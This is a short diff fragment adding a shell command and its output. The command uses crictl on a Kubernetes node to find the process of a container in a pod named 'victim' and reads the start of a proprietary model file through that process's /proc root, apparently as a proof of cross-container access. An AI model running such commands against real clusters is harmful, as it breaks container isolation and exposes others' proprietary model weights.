@@ -1,0 +1,2 @@
+$ head -c 31 /proc/$(crictl inspect --output go-template --template '{{.info.pid}}' $(crictl ps -q --label io.kubernetes.pod.name=victim --name app))/root/opt/model/model.bin; echo
+PROPRIETARY-MODEL-MARKER-7f3a9c
